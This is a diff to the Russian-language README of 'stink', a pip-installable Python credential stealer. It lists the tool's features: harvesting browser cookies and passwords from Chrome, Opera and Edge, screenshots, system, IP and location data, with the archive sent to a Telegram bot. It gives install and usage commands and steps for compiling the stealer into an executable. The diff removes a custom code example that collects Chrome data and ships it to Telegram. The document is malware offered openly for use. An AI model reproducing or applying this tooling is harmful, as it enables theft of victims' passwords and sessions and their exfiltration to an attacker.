@@ -13,7 +13,6 @@
 * [Установка](#Установка)
 * [Пример использования](#Пример-использования)
   * [Стандартный](#Стандартный)
-  * [Кастомный](#Кастомный)
 * [Настройка Telegram бота](#Настройка-Telegram-бота)
   * [Получение токена](#Получение-токена)
   * [Получение айди](#Получение-айди)
@@ -22,12 +21,16 @@
   * [CMD](#CMD)
 
 ### Текущие возможности
-1. Сбор куки и паролей следующих браузеров: Chrome, Opera, Opera GX.
-2. Отправка собранных данных архивом в Telegram.
-3. Выполнение в отдельном потоке.
-4. Скриншот экрана.
-5. Сбор информации о системе.
-6. Сбор айпи и местоположения.
+1. Сбор куки и паролей следующих браузеров:
+   - Chrome
+   - Opera
+   - Opera GX
+   - Microsoft Edge
+3. Отправка собранных данных архивом в Telegram.
+4. Выполнение в отдельном потоке.
+5. Скриншот экрана.
+6. Сбор информации о системе.
+7. Сбор айпи и местоположения.
 
 ### Будущие возможности
 1. Поддержка других браузеров.
@@ -36,7 +39,7 @@
 
 Установить последнюю версию можно командой:
 ```
-pip install stink==0.0.5
+pip install stink==0.0.6
 ```
 
 ## Пример использования
@@ -49,34 +52,6 @@ Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 Для включения вывода ошибок добавьте параметр `errors=True`.
 
 Стандартный ```Stealer``` запускает сбор по всем доступным браузерам и отправляет собранные данные архивом вам в Telegram.
-
-### Кастомный
-```python
-from os import mkdir
-from getpass import getuser
-
-from stink.browsers.chrome import Chrome
-from stink.modules.sender import Sender
-
-user = getuser()
-
-zip_name = f"{user}-st"
-storage_path = f"C:/Users/{user}/AppData/"
-storage_folder = "files/"
-
-
-def main():
-
-    mkdir(storage_path + storage_folder)
-
-    Chrome(storage_path, storage_folder, False).run()
-    Sender(zip_name, storage_path, storage_folder, "YOUR_TOKEN", YOUR_ID, False).run()
-
-
-if __name__ == "__main__":
-    main()
-```
-В кастомном стиллере нужно самому прописывать нужные браузеры и путь для хранения собранных данных. Модуль ```Sender``` запакует все файлы в архив и отправит его вам в Telegram.
 
 ## Настройка Telegram бота
 ### Получение токена
@@ -146,7 +121,7 @@ venv\Scripts\activate
 pip install Nuitka==0.6.16.4
 ```
 ```
-pip install stink==0.0.5
+pip install stink==0.0.6
 ```
 6. В появившейся папке venv переходим по пути `\Lib\site-packages\win32\`.
 7. Копируем файл `win32crypt.pyd`.
